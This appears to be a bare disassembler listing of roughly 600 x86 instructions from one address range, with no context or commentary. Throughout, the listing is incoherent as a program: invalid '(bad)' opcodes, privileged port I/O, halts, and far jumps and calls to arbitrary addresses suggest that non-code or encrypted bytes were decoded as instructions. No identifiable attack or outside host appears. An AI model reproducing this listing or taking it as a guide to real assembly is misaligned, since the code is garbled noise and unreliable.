  41b5d3:	in     eax,dx
  41b5d4:	xlat   BYTE PTR ds:[ebx]
  41b5d5:	shr    DWORD PTR [edx-0x43f6f1e2],0x7e
  41b5dc:	aaa    
  41b5dd:	mov    ch,0x70
  41b5df:	xor    al,0xa7
  41b5e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5e2:	retf   
  41b5e3:	mov    bh,0x34
  41b5e5:	ds aas 
  41b5e7:	push   edx
  41b5e8:	cmp    al,0xe0
  41b5ea:	cmc    
  41b5eb:	inc    esp
  41b5ec:	lds    esi,FWORD PTR [ebx]
  41b5ee:	add    al,0x45
  41b5f0:	data16 fdivr DWORD PTR [esi]
  41b5f3:	pop    ss
  41b5f4:	sub    al,0x5c
  41b5f6:	xchg   esi,eax
  41b5f7:	mov    BYTE PTR [edi+0x6a],bh
  41b5fa:	dec    ebp
  41b5fb:	mov    esi,0xae6f7eb0
  41b600:	xchg   dh,bl
  41b602:	out    dx,al
  41b603:	xor    eax,0x9a06faa5
  41b608:	adc    dh,dh
  41b60a:	xor    eax,0xfa5612a2
  41b60f:	mov    fs,WORD PTR ds:0x43c6845c
  41b615:	cmc    
  41b616:	sub    DWORD PTR [ebx],esp
  41b618:	loop   0x41b637
  41b61a:	mov    bl,0xdb
  41b61c:	(bad)  
  41b61d:	mov    dl,0xba
  41b61f:	pushf  
  41b620:	and    eax,0x774b3f3f
  41b625:	std    
  41b626:	adc    dl,BYTE PTR [ebx-0x5f]
  41b629:	sub    al,0xbc
  41b62b:	das    
  41b62c:	mov    ?,WORD PTR [eax+0x4a]
  41b62f:	dec    eax
  41b630:	(bad)  
  41b631:	or     edi,esp
  41b633:	jne    0x41b69e
  41b635:	aas    
  41b636:	or     BYTE PTR [ecx-0x64],dl
  41b639:	neg    DWORD PTR [ebx-0x3606c76f]
  41b63f:	in     al,dx
  41b640:	mov    esp,0x7fc2d2b1
  41b645:	hlt    
  41b646:	popf   
  41b647:	xchg   edi,eax
  41b648:	out    0x5f,al
  41b64a:	inc    edx
  41b64b:	sbb    eax,0xd887d0f8
  41b650:	push   0x75
  41b652:	test   dl,al
  41b654:	and    eax,0x3011d8a2
  41b659:	xchg   ecx,eax
  41b65a:	pusha  
  41b65b:	adc    eax,0x635dc9af
  41b660:	bound  edi,QWORD PTR [edi]
  41b662:	mov    ah,0x19
  41b664:	test   eax,0x76c5489a
  41b669:	mov    dh,BYTE PTR [esp+eax*1+0x2a4cb5dd]
  41b670:	and    DWORD PTR [esi],ecx
  41b672:	adc    esp,DWORD PTR [ebx]
  41b674:	pop    ebx
  41b675:	cmp    dl,cl
  41b677:	adc    eax,0x766c6657
  41b67c:	clc    
  41b67d:	cmp    DWORD PTR [eax-0x7d4912ac],ebx
  41b683:	ror    DWORD PTR [esi],cl
  41b685:	jp     0x41b6ad
  41b687:	mov    bl,0x82
  41b689:	out    0xbd,al
  41b68b:	sub    al,0x7f
  41b68d:	add    eax,0x1378dbf5
  41b692:	sub    ah,BYTE PTR [ecx+0x59318315]
  41b698:	adc    edx,eax
  41b69a:	mov    dl,0xcc
  41b69c:	sub    BYTE PTR [ebx+0x3a44dd90],dh
  41b6a2:	and    esp,DWORD PTR [ecx]
  41b6a4:	in     eax,0xac
  41b6a6:	cmp    al,0xba
  41b6a8:	pop    edx
  41b6a9:	fdivrp st(1),st
  41b6ab:	lock stc 
  41b6ad:	cmp    al,0xd3
  41b6af:	adc    cl,dh
  41b6b1:	and    BYTE PTR [ebx+0x7],dh
  41b6b4:	cmp    DWORD PTR [ebp-0x2fa64b9d],ebx
  41b6ba:	les    ebx,FWORD PTR [edi-0x5ff11369]
  41b6c0:	dec    ebx
  41b6c1:	jmp    0x41b67c
  41b6c3:	into   
  41b6c4:	jnp    0x41b6f9
  41b6c6:	shl    BYTE PTR [edx+ecx*1],0x63
  41b6ca:	sbb    al,0xe
  41b6cc:	jmp    0xfa39:0xe441e2b4
  41b6d3:	mov    al,ds:0xcfa38348
  41b6d8:	das    
  41b6d9:	xor    dh,BYTE PTR [ecx+0x6c]
  41b6dc:	imul   esp,DWORD PTR [edx+0xf],0xffffffbd
  41b6e0:	or     dl,BYTE PTR [esi-0x51]
  41b6e3:	mov    ch,BYTE PTR gs:[edi-0x2c]
  41b6e7:	push   esp
  41b6e8:	and    eax,0x1f5fbcb4
  41b6ed:	pop    ebp
  41b6ee:	xchg   ecx,ebx
  41b6f0:	mov    ah,0x5f
  41b6f2:	mov    eax,ds:0xbc05554a
  41b6f7:	mov    ds:0x50b8a9a8,al
  41b6fc:	xlat   BYTE PTR ds:[ebx]
  41b6fd:	push   ecx
  41b6fe:	pop    esp
  41b6ff:	jns    0x41b6ff
  41b701:	jmp    0xa9f5:0x841f8f9b
  41b708:	inc    ecx
  41b709:	iret   
  41b70a:	xor    esp,0xffffffa4
  41b70d:	dec    edi
  41b70e:	xor    dh,BYTE PTR [ebx]
  41b710:	and    ebx,DWORD PTR [edx+0xb]
  41b713:	pusha  
  41b714:	ficomp DWORD PTR [esp+edx*8+0x1f21330c]
  41b71b:	ss mov bl,0xca
  41b71e:	outs   dx,DWORD PTR ds:[esi]
  41b71f:	enter  0xe51f,0xc6
  41b723:	cdq    
  41b724:	dec    esi
  41b725:	rol    DWORD PTR [edi-0x52],1
  41b728:	jbe    0x41b79a
  41b72a:	cmp    cl,BYTE PTR ss:[edi]
  41b72d:	xor    DWORD PTR [eax+0x2492fc79],ebx
  41b733:	sbb    ebx,DWORD PTR [ebp-0x74e09639]
  41b739:	lods   eax,DWORD PTR ds:[esi]
  41b73a:	jno    0x41b6c6
  41b73c:	sbb    eax,0xc49d3a7d
  41b741:	push   0xffffffa7
  41b743:	adc    dl,BYTE PTR [eax-0x605b2d23]
  41b749:	sbb    eax,0x141b5e46
  41b74e:	icebp  
  41b74f:	push   eax
  41b750:	out    0xfc,eax
  41b752:	mov    eax,0x8402d735
  41b757:	test   al,0xed
  41b759:	jo     0x41b6f2
  41b75b:	adc    eax,0x2da5ddd1
  41b760:	fisubr DWORD PTR [esi+0x72bf3f3f]
  41b766:	vandps xmm2,xmm0,xmm2
  41b76a:	addr16 ret 0x483c
  41b76e:	imul   edx,DWORD PTR [edi],0xffee0558
  41b774:	js     0x41b7b5
  41b776:	outs   dx,DWORD PTR ds:[esi]
  41b777:	push   ecx
  41b778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b779:	xor    ah,dh
  41b77b:	test   al,0xdb
  41b77d:	push   edx
  41b77e:	inc    eax
  41b77f:	mov    edx,0x791ca7f5
  41b784:	and    bh,BYTE PTR [edx+0x32aa490f]
  41b78a:	cwde   
  41b78b:	sbb    edi,DWORD PTR [ebx-0x48]
  41b78e:	adc    DWORD PTR [ebx+edi*2],esi
  41b791:	sbb    bh,BYTE PTR [esi+0x40]
  41b794:	cli    
  41b795:	test   eax,0xcceeb631
  41b79a:	cwde   
  41b79b:	sub    DWORD PTR [ebx],0xfffffffd
  41b79e:	test   al,0x12
  41b7a0:	cmp    al,0x7d
  41b7a2:	sub    eax,0x7b03d4cf
  41b7a7:	ficomp WORD PTR [edx+0x14c3c932]
  41b7ad:	push   ss
  41b7ae:	sbb    al,0x7c
  41b7b0:	push   edi
  41b7b1:	lods   eax,DWORD PTR ds:[esi]
  41b7b2:	mov    BYTE PTR [esi],ch
  41b7b4:	xchg   edi,eax
  41b7b5:	add    ebp,DWORD PTR [ecx]
  41b7b7:	call   0xe1b5:0x63d85afa
  41b7be:	sbb    DWORD PTR [edi-0x1e14c92e],eax
  41b7c4:	cmp    DWORD PTR [ebp-0x7d96de09],edi
  41b7ca:	lahf   
  41b7cb:	pop    ecx
  41b7cc:	popf   
  41b7cd:	or     eax,0x59ba9c4c
  41b7d2:	rol    bh,cl
  41b7d4:	cmp    esi,DWORD PTR [edx]
  41b7d6:	sbb    eax,0x9446971f
  41b7db:	mov    dl,0xfe
  41b7dd:	and    DWORD PTR [esi-0x46],eax
  41b7e0:	mov    cl,0x8b
  41b7e2:	(bad)  
  41b7e3:	in     al,dx
  41b7e4:	xor    al,0x6a
  41b7e6:	jnp    0x41b844
  41b7e8:	mov    BYTE PTR [ebx+0xd],ch
  41b7eb:	cs xchg edx,eax
  41b7ed:	pop    esp
  41b7ee:	xor    bh,BYTE PTR gs:[ebx-0x2c]
  41b7f2:	je     0x41b823
  41b7f4:	pop    ss
  41b7f5:	push   ds
  41b7f6:	dec    eax
  41b7f7:	es dec edx
  41b7f9:	sbb    bl,BYTE PTR [ecx-0x403cdc68]
  41b7ff:	mov    edi,0x2fc5b74d
  41b804:	mov    ch,0x25
  41b806:	sbb    DWORD PTR [edi-0x3d],ecx
  41b809:	sti    
  41b80a:	and    dh,al
  41b80c:	rcr    DWORD PTR [eax-0x80],0xa1
  41b810:	inc    ecx
  41b811:	std    
  41b812:	xor    al,0x70
  41b814:	pop    edx
  41b815:	cwde   
  41b816:	push   eax
  41b817:	jge    0x41b7ca
  41b819:	js     0x41b7f2
  41b81b:	mov    cl,0x85
  41b81d:	mov    gs,eax
  41b81f:	jne    0x41b877
  41b821:	in     al,0x41
  41b823:	jbe    0x41b838
  41b825:	rol    DWORD PTR [ebx-0x1a62ea84],1
  41b82b:	cld    
  41b82c:	jl     0x41b7e0
  41b82e:	mov    ecx,0x6575324b
  41b833:	xor    esi,DWORD PTR [ebp-0x7f]
  41b836:	cdq    
  41b837:	jae    0x41b839
  41b839:	pushf  
  41b83a:	fiadd  DWORD PTR [eax]
  41b83c:	lods   al,BYTE PTR ds:[esi]
  41b83d:	je     0x41b850
  41b83f:	clc    
  41b840:	mov    cl,0x45
  41b842:	daa    
  41b843:	pop    eax
  41b844:	and    eax,0x1155eb77
  41b849:	popf   
  41b84a:	cmp    ebx,ecx
  41b84c:	push   cs
  41b84d:	shl    DWORD PTR [edx-0x64],0x4a
  41b851:	xchg   DWORD PTR [eax],eax
  41b853:	nop
  41b854:	inc    esp
  41b855:	push   eax
  41b856:	stos   BYTE PTR es:[edi],al
  41b857:	or     dh,dl
  41b859:	sbb    DWORD PTR [edi-0x58],ebx
  41b85c:	in     eax,dx
  41b85d:	dec    esp
  41b85e:	mov    bh,0xda
  41b860:	push   ebx
  41b861:	repnz pop ss
  41b863:	inc    eax
  41b864:	sbb    ah,BYTE PTR [ecx+0x1da2de22]
  41b86a:	mov    bl,0xb8
  41b86c:	fs mov bl,0x25
  41b86f:	inc    esi
  41b870:	lea    eax,[ecx]
  41b872:	jnp    0x41b82f
  41b874:	shl    DWORD PTR [esp+ebx*8-0x13845648],cl
  41b87b:	mov    edx,0xf836448b
  41b880:	pusha  
  41b881:	ss popa 
  41b883:	or     al,0x48
  41b885:	(bad)  
  41b886:	push   edx
  41b887:	ins    BYTE PTR es:[edi],dx
  41b888:	jo     0x41b8c2
  41b88a:	jno    0x41b874
  41b88c:	pop    edi
  41b88d:	in     eax,0xb0
  41b88f:	cmp    ecx,ebp
  41b891:	mov    ds:0xe1108f63,eax
  41b896:	div    edx
  41b898:	add    al,0xce
  41b89a:	ds adc esp,ebx
  41b89d:	fs aas 
  41b89f:	inc    edi
  41b8a0:	jno    0x41b8c4
  41b8a2:	nop
  41b8a3:	mov    dh,0xec
  41b8a5:	mov    eax,ds:0xc1dc9c0
  41b8aa:	pushf  
  41b8ab:	cwde   
  41b8ac:	inc    eax
  41b8ad:	or     edi,ebp
  41b8af:	test   eax,0xde0c69f3
  41b8b4:	dec    eax
  41b8b5:	jbe    0x41b8b0
  41b8b7:	inc    esp
  41b8b8:	adc    ch,cl
  41b8ba:	cwde   
  41b8bb:	js     0x41b8fb
  41b8bd:	clc    
  41b8be:	sbb    BYTE PTR [ebp+eax*2+0x514a26dd],bh
  41b8c5:	push   ebx
  41b8c6:	dec    eax
  41b8c7:	pusha  
  41b8c8:	call   0xa0229726
  41b8cd:	xchg   ebp,eax
  41b8ce:	mov    BYTE PTR [ecx+edi*1+0x55],bh
  41b8d2:	mov    esi,DWORD PTR ds:0x6abc7309
  41b8d8:	call   0x9e6c:0x5067f4e8
  41b8df:	(bad)  
  41b8e0:	mov    ds:0x2de77826,al
  41b8e5:	call   DWORD PTR [esi+0x76093a02]
  41b8eb:	repnz mov edi,0xbdb7e6cb
  41b8f1:	mov    DWORD PTR [edx-0x70],edi
  41b8f4:	fs test al,0x25
  41b8f7:	sbb    BYTE PTR ds:0xc44dbbb1,al
  41b8fd:	mov    ds:0x35b54d34,al
  41b902:	stos   BYTE PTR es:[edi],al
  41b903:	inc    ebp
  41b904:	dec    edi
  41b905:	iret   
  41b906:	addr16 pop edx
  41b908:	xor    BYTE PTR [edx],dl
  41b90a:	imul   edi,DWORD PTR [ecx-0x538ae788],0x73
  41b911:	sbb    eax,0xe28969ab
  41b916:	or     BYTE PTR [edx+0x47],bl
  41b919:	fdivr  DWORD PTR [ebx+0x5abf69b3]
  41b91f:	xchg   ecx,eax
  41b920:	fwait
  41b921:	popa   
  41b922:	loope  0x41b8fd
  41b924:	or     DWORD PTR [ecx],eax
  41b926:	cmp    eax,0xa2bf66d1
  41b92b:	(bad)  [edi-0x6fcf5960]
  41b931:	jmp    0x4dc1:0xda8c2a52
  41b938:	inc    edx
  41b939:	inc    edi
  41b93a:	adc    BYTE PTR [ebx],0xdb
  41b93d:	inc    esp
  41b93e:	fnstenv [ebx]
  41b940:	mov    ds:0x7dd668e9,eax
  41b945:	jbe    0x41b995
  41b947:	cmp    esp,DWORD PTR [edi]
  41b949:	inc    esp
  41b94a:	mov    esi,0x75309f62
  41b94f:	outs   dx,BYTE PTR ds:[esi]
  41b950:	enter  0x2dc8,0x45
  41b954:	push   0x1
  41b956:	sbb    ch,BYTE PTR [eax+0x1848a220]
  41b95c:	mov    ebp,0x109f7b8c
  41b961:	ins    BYTE PTR es:[edi],dx
  41b962:	mov    ebx,0x83c0ea15
  41b967:	xchg   DWORD PTR [esi],ebx
  41b969:	jge    0x41b9c3
  41b96b:	xchg   dh,ch
  41b96d:	in     eax,0x3d
  41b96f:	sbb    eax,0xaa6a53e0
  41b974:	and    DWORD PTR [edx+edx*1-0x77a46479],edx
  41b97b:	xchg   DWORD PTR [ecx+0x5864c2a1],ecx
  41b981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b982:	cmp    BYTE PTR [eax+0x1b],bh
  41b985:	ror    edi,0xc8
  41b988:	xchg   ebx,eax
  41b989:	and    cl,al
  41b98b:	lock and DWORD PTR [edi+0x77b83470],ecx
  41b992:	push   edi
  41b993:	cmc    
  41b994:	mov    bl,0xc0
  41b996:	push   ebp
  41b997:	(bad)  
  41b999:	mov    ah,0x8e
  41b99b:	fs sti 
  41b99d:	jno    0x41b9d9
  41b99f:	push   eax
  41b9a0:	sar    ch,0x56
  41b9a3:	sbb    al,0xa9
  41b9a5:	ins    DWORD PTR es:[edi],dx
  41b9a6:	mov    eax,ds:0xa43853c2
  41b9ab:	xchg   DWORD PTR [edx],edx
  41b9ad:	frstor [edx+0x4b]
  41b9b0:	pop    edi
  41b9b1:	(bad)
  41b9b4:	cmp    eax,0x464f037f
  41b9b9:	out    0xde,eax
  41b9bb:	jnp    0x41ba2d
  41b9bd:	sar    DWORD PTR [ebp-0x74d17ce5],1
  41b9c3:	jbe    0x41ba14
  41b9c5:	out    0x3e,eax
  41b9c7:	add    bh,BYTE PTR [ecx+0x30f25b50]
  41b9cd:	jle    0x41ba25
  41b9cf:	push   eax
  41b9d0:	add    ebp,ecx
  41b9d2:	ins    DWORD PTR es:[edi],dx
  41b9d3:	fsub   st,st(1)
  41b9d5:	in     eax,0xf4
  41b9d7:	push   es
  41b9d8:	pop    ebx
  41b9d9:	adc    DWORD PTR [ebp-0x7c],edi
  41b9dc:	add    dh,BYTE PTR [ecx]
  41b9de:	dec    esi
  41b9df:	clc    
  41b9e0:	mov    bl,0xbc
  41b9e2:	popf   
  41b9e3:	bound  ecx,QWORD PTR [edx+0x58048f0d]
  41b9e9:	out    dx,al
  41b9ea:	and    bh,BYTE PTR [eax]
  41b9ec:	cmp    edi,0xfbc83658
  41b9f2:	jo     0x41b994
  41b9f4:	dec    eax
  41b9f5:	xchg   ebx,eax
  41b9f6:	xlat   BYTE PTR ds:[ebx]
  41b9f7:	mov    edx,0x1911cecb
  41b9fc:	inc    ebx
  41b9fd:	rcl    bl,cl
  41b9ff:	stos   DWORD PTR es:[edi],eax
  41ba00:	pop    eax
  41ba01:	out    dx,al
  41ba02:	das    
  41ba03:	mov    bh,0x55
  41ba05:	popa   
  41ba06:	sbb    DWORD PTR [ecx+0x1],esp
  41ba09:	js     0x41b9dc
  41ba0b:	(bad)  
  41ba0c:	xchg   ebx,eax
  41ba0d:	xchg   esi,eax
  41ba0e:	lahf   
  41ba0f:	mov    bx,0x2b7c
  41ba13:	sbb    BYTE PTR [ebx-0x4a],bl
  41ba16:	push   ecx
  41ba17:	daa    
  41ba18:	adc    DWORD PTR [ebx-0x6c],eax
  41ba1b:	mov    eax,ds:0xdc71f41c
  41ba20:	ficom  DWORD PTR [eax+0x73]
  41ba23:	mul    esp
  41ba25:	in     eax,dx
  41ba26:	or     al,0x3b
  41ba28:	adc    ah,BYTE PTR [ebx-0x1d]
  41ba2b:	dec    ebp
  41ba2c:	repz mov cl,0x8b
  41ba2f:	push   eax
  41ba30:	clc    
  41ba31:	ins    BYTE PTR es:[edi],dx
  41ba32:	scas   al,BYTE PTR es:[edi]
  41ba33:	int3   
  41ba34:	test   al,0x51
  41ba36:	mov    al,BYTE PTR [edx+0xc]
  41ba39:	imul   eax,DWORD PTR [ecx+0x2a121c],0x10f9dd5a
  41ba43:	frstor [edx]
  41ba45:	jbe    0x41b9ed
  41ba47:	(bad)  [esi]
  41ba49:	cli    
  41ba4a:	std    
  41ba4b:	dec    ebp
  41ba4c:	fstp   DWORD PTR [esi-0x2c]
  41ba4f:	lods   eax,DWORD PTR gs:[esi]
  41ba51:	adc    bh,al
  41ba53:	lods   eax,DWORD PTR ds:[esi]
  41ba54:	(bad)  
  41ba55:	arpl   WORD PTR [esi],dx
  41ba57:	and    al,BYTE PTR [ebp-0x73b76ce]
  41ba5d:	cli    
  41ba5e:	enter  0xdf08,0xd9
  41ba62:	mov    edi,0xd9de6e75
  41ba67:	adc    dl,BYTE PTR cs:[esi+0x3e25657f]
  41ba6e:	icebp  
  41ba6f:	lahf   
  41ba70:	or     DWORD PTR [edx-0x716f8aa2],ebx
  41ba76:	arpl   WORD PTR [esi],dx
  41ba78:	cmp    esi,DWORD PTR [eax]
  41ba7a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41ba7c:	lods   al,BYTE PTR ds:[esi]
  41ba7d:	sbb    ecx,0x51cd75be
  41ba83:	test   BYTE PTR [edx+0x138cfcc5],bh
  41ba89:	lds    edi,FWORD PTR [ecx-0x1785a018]
  41ba8f:	imul   ecx,DWORD PTR [ecx],0xec95b2f9
  41ba95:	loope  0x41bb08
  41ba97:	and    BYTE PTR [esi+ebp*4-0x1b],dh
  41ba9b:	sar    BYTE PTR [eax+0x57],cl
  41ba9e:	push   esi
  41ba9f:	pop    ebx
  41baa0:	das    
  41baa1:	popf   
  41baa2:	pop    esi
  41baa3:	pop    esp
  41baa4:	or     ah,BYTE PTR [ebp-0x10]
  41baa7:	dec    eax
  41baa8:	imul   esi,DWORD PTR [edi-0x2187e55f],0x744146ee
  41bab2:	sbb    ah,BYTE PTR [ebx-0x7086eb39]
  41bab8:	jg     0x41bae4
  41baba:	sub    BYTE PTR [ebp-0x26],al
  41babd:	daa    
  41babe:	and    DWORD PTR [eax+edi*4],0x4634d7f0
  41bac5:	ins    DWORD PTR es:[edi],dx
  41bac6:	(bad)  
  41bac7:	call   0xe9af7131
  41bacc:	bound  esp,QWORD PTR [ebx]
  41bace:	in     eax,dx
  41bacf:	neg    DWORD PTR [ebp+0x4]
  41bad2:	icebp  
  41bad3:	icebp  
  41bad4:	xchg   esp,eax
  41bad5:	ss mov ebx,0x73e7898d
  41badb:	and    dh,BYTE PTR [eax+0x6]
  41bade:	inc    ebx
  41badf:	mov    eax,0x3b6475ee
  41bae4:	stos   DWORD PTR es:[edi],eax
  41bae5:	cmp    eax,DWORD PTR [ecx+0x4e]
  41bae8:	cmc    
  41bae9:	(bad)  
  41baea:	int3   
  41baeb:	inc    edi
  41baec:	in     eax,0x2b
  41baee:	(bad)  
  41baef:	fsub   st,st(1)
  41baf1:	stos   DWORD PTR es:[edi],eax
  41baf2:	ins    BYTE PTR es:[edi],dx
  41baf3:	test   BYTE PTR [edi],ch
  41baf5:	lds    esp,FWORD PTR [ecx-0x39d3a95b]
  41bafb:	daa    
  41bafc:	div    DWORD PTR [edx]
  41bafe:	add    eax,0x88c51ca3
  41bb03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb04:	dec    esi
  41bb05:	mov    dh,0xc3
  41bb07:	in     al,0x69
  41bb09:	lock imul edi,DWORD PTR [edx-0x71],0x19
  41bb0e:	and    BYTE PTR [eax],bl
  41bb10:	pop    ss
  41bb11:	pop    ebp
  41bb12:	mov    ebp,0x652fd18b
  41bb17:	test   DWORD PTR [esi+0x5204020a],0x7ab91282
  41bb21:	pop    esp
  41bb22:	sub    esp,DWORD PTR [ebx+0x67]
  41bb25:	push   ebx
  41bb26:	scas   eax,DWORD PTR es:[edi]
  41bb27:	pusha  
  41bb28:	jg     0x41bb67
  41bb2a:	in     al,0x68
  41bb2c:	jge    0x41bb7c
  41bb2e:	xor    eax,0x5cea09d0
  41bb33:	and    BYTE PTR [edx+0x7613564f],ah
  41bb39:	cmp    eax,0x9d6783b3
  41bb3e:	push   eax
  41bb3f:	mov    fs,WORD PTR [edx+eiz*1-0x14]
  41bb43:	jg     0x41baff
  41bb45:	mov    bl,0x92
  41bb47:	popf   
  41bb48:	or     ch,ah
  41bb4a:	mov    esp,0xc3f7cb93
  41bb4f:	jle    0x41bafe
  41bb51:	fs jmp 0xdf12:0x2653addf
  41bb59:	enter  0x6abd,0x13
  41bb5d:	xor    edx,ebp
  41bb5f:	inc    esi
  41bb60:	jl     0x41bbb8
  41bb62:	int3   
  41bb63:	mov    dl,0xac
  41bb65:	ret    
  41bb66:	push   esp
  41bb67:	or     eax,ebp
  41bb69:	dec    eax
  41bb6a:	and    BYTE PTR [ebp+0x67],bh
  41bb6d:	push   ss
  41bb6e:	push   es
  41bb6f:	fistp  DWORD PTR [edx]
  41bb71:	xchg   BYTE PTR [ebx-0x52d20b5f],bl
  41bb77:	pop    DWORD PTR [esi+eiz*8]
  41bb7a:	in     eax,dx
  41bb7b:	cmpxchg DWORD PTR [ecx],ebp
  41bb7e:	inc    esi
  41bb7f:	imul   edx,ecx,0x5af14997
  41bb85:	jns    0x41bb94
  41bb87:	iret   
  41bb88:	popf   
  41bb89:	imul   ecx
  41bb8b:	jb     0x41bb8b
  41bb8d:	sub    BYTE PTR [ebx+0x4c57c24a],dh
  41bb93:	in     al,dx
  41bb94:	push   esi
  41bb95:	pop    edi
  41bb96:	xor    ebp,DWORD PTR [ecx+0x4adc1936]
  41bb9c:	out    0xf6,al
  41bb9e:	mov    cl,0xc4
  41bba0:	jae    0x41bbd1
  41bba2:	xor    DWORD PTR [ebx+0x39a93c55],0x1b
  41bba9:	jecxz  0x41bb36
  41bbab:	ror    edi,0x3
  41bbae:	cdq    
  41bbaf:	aad    0x8e
  41bbb1:	mov    ebp,0x59c451e3
  41bbb6:	add    BYTE PTR [edi+0x40],dh
  41bbb9:	add    BYTE PTR [esi],cl
  41bbbb:	dec    edx
  41bbbc:	aam    0xf5
  41bbbe:	call   0xec3a:0x96d7f3cd
  41bbc5:	bnd data16 js 0x41bb86
  41bbc9:	ss pop ds
  41bbcb:	mov    ch,0x71
  41bbcd:	mov    dh,0x12
  41bbcf:	mov    al,0xe0
  41bbd1:	sbb    esp,DWORD PTR [ebx]
  41bbd3:	dec    edx
  41bbd4:	xlat   BYTE PTR ds:[ebx]
  41bbd5:	fisub  WORD PTR [edi]
  41bbd7:	add    eax,0x7341c0e
  41bbdc:	mov    DWORD PTR [ecx-0x5b],ecx
  41bbdf:	gs pop edi
  41bbe1:	add    esp,DWORD PTR [ebp+0x485e47a7]
  41bbe7:	mov    eax,ds:0x7808a6c8
  41bbec:	shrd   DWORD PTR [edx-0x6362b783],ebp,0x8e
  41bbf4:	mov    al,ds:0xf81d7332
  41bbf9:	cmp    DWORD PTR [ecx-0x14cc14d],edi
  41bbff:	sete   bl
  41bc02:	mov    ebx,0x7b54e89e
  41bc07:	dec    ecx
  41bc08:	cmp    edx,DWORD PTR [esi]
  41bc0a:	jb     0x41bbeb
  41bc0c:	mov    WORD PTR [ebx-0x129fdabf],fs
  41bc12:	xor    BYTE PTR [ecx-0x230e5298],bh
  41bc18:	xor    DWORD PTR [ebx],0xffffff80
  41bc1b:	std    
  41bc1c:	cdq    
  41bc1d:	(bad)  
  41bc1e:	aas    
  41bc1f:	ss jmp 0x94d4017a
  41bc25:	push   ecx
  41bc26:	int3   
  41bc27:	popa   
  41bc28:	lock mov al,ds:0x24fc818d
  41bc2e:	sub    al,0xd4
  41bc30:	stos   BYTE PTR es:[edi],al
  41bc31:	ins    BYTE PTR es:[edi],dx
  41bc32:	mov    BYTE PTR [esi],dl
  41bc34:	icebp  
  41bc35:	aad    0xb0
  41bc37:	push   0xffffff8a
  41bc39:	or     bh,BYTE PTR [ebp+eiz*4+0x7cffd6b6]
  41bc40:	adc    al,0x18
  41bc42:	push   0x9d26c47e
  41bc47:	pop    ecx
  41bc48:	jae    0x41bbd4
  41bc4a:	jnp    0x41bc82
  41bc4c:	inc    edi
  41bc4d:	ret    
  41bc4e:	(bad)  
  41bc4f:	das    
  41bc50:	fimul  DWORD PTR [ebx+0x2e]
  41bc53:	push   edx
  41bc54:	in     al,0x4f
  41bc56:	das    
  41bc57:	mov    al,0xb9
  41bc59:	dec    edi
  41bc5a:	(bad)  
  41bc5c:	jmp    0x41bcae
  41bc5e:	ds aad 0x1f
  41bc61:	popf   
  41bc62:	pop    esi
  41bc63:	pop    edx
  41bc64:	dec    edx
  41bc65:	sbb    DWORD PTR [eax],esi
  41bc67:	js     0x41bc2b
  41bc69:	(bad)  
  41bc6a:	icebp  
  41bc6b:	and    ah,BYTE PTR [esi]
  41bc6d:	or     DWORD PTR [ebx],0x3e
  41bc70:	xlat   BYTE PTR ds:[ebx]
  41bc71:	mov    esi,0xc365f25f
  41bc76:	pop    ds
  41bc77:	push   esp
  41bc78:	daa    
  41bc79:	pop    ebp
  41bc7a:	dec    ecx
  41bc7b:	fnstsw WORD PTR [edx-0x692030ae]
  41bc81:	std    
  41bc82:	test   al,0xfa
  41bc84:	out    0x12,al
  41bc86:	out    0x1c,al
  41bc88:	sbb    ebx,eax
  41bc8a:	iret   
  41bc8b:	push   esp
  41bc8c:	into   
  41bc8d:	ror    BYTE PTR [eax+0x40ed3571],cl
  41bc93:	sbb    BYTE PTR [ecx+eiz*8],dh
  41bc96:	lods   al,BYTE PTR ds:[esi]
  41bc97:	pop    eax
  41bc98:	mov    dl,0x9c
  41bc9a:	mov    ds:0xd79562f9,eax
  41bc9f:	fadd   st(1),st
  41bca1:	xchg   edx,eax
  41bca2:	cdq    
  41bca3:	mov    bl,0x48
  41bca5:	cmpps  xmm2,XMMWORD PTR [edx+0x25],0xa9
  41bcaa:	inc    edi
  41bcab:	lods   al,BYTE PTR ds:[esi]
  41bcac:	inc    eax
  41bcad:	push   ebx
  41bcae:	jb     0x41bc66
  41bcb0:	sub    al,al
  41bcb2:	bound  esp,QWORD PTR [edx-0x36]
  41bcb5:	in     eax,0xe7
  41bcb7:	add    al,BYTE PTR [ebp+0x232a2a92]
  41bcbd:	retf   
  41bcbe:	test   BYTE PTR [esi-0xf86ab6a],dh
  41bcc4:	adc    ebx,edx
  41bcc6:	loopne 0x41bcd0
  41bcc8:	call   DWORD PTR [ecx+0x7d38b83c]
  41bcce:	inc    esi
  41bccf:	fwait
  41bcd0:	lds    edi,FWORD PTR [ebx+0x39b8a025]
  41bcd6:	dec    ecx
  41bcd7:	out    dx,eax
  41bcd8:	inc    edx
  41bcd9:	mov    ecx,0xcf449784
  41bcde:	cld    
  41bcdf:	xor    DWORD PTR ds:0x723bc237,esp
  41bce5:	call   0xfc5004be
  41bcea:	inc    esi
  41bceb:	pop    esp
  41bcec:	xchg   DWORD PTR [ebp+0x68],edx
  41bcef:	mov    esp,0x3fbad4f9
  41bcf4:	push   esi
  41bcf5:	pusha  
  41bcf6:	inc    edi
  41bcf7:	ins    DWORD PTR es:[edi],dx
  41bcf8:	cmp    DWORD PTR [esi+0x27],0x2a
  41bcfc:	int    0x5
  41bcfe:	bound  ecx,QWORD PTR [eax+0x907320]
  41bd04:	adc    eax,0x81cd996b
  41bd09:	call   0xda3e:0xbd566fc7
  41bd10:	jno    0x41bd23
  41bd12:	xchg   BYTE PTR [edi+0x24d26b1f],ch
  41bd18:	jnp    0x41bcfe
  41bd1a:	inc    ecx
  41bd1b:	pop    eax
  41bd1c:	shl    DWORD PTR [edi-0x27],cl
  41bd1f:	stos   DWORD PTR es:[edi],eax
  41bd20:	pop    ds
  41bd21:	inc    esp
  41bd22:	xchg   cl,bl
  41bd24:	into   
  41bd25:	dec    ecx
  41bd26:	and    BYTE PTR [esp+eiz*8-0x2c2cd762],0xf3
  41bd2e:	sub    ebp,edi
  41bd30:	out    dx,al
  41bd31:	mov    ah,0xb3
  41bd33:	ret    
  41bd34:	inc    ebp
  41bd35:	cmp    edi,eax
  41bd37:	jmp    0x33d1:0x4cba55fd
  41bd3e:	mov    ebx,0xd8fa0dd8
  41bd43:	loopne 0x41bcff
  41bd45:	cld    
  41bd46:	out    dx,al
  41bd47:	jecxz  0x41bd85
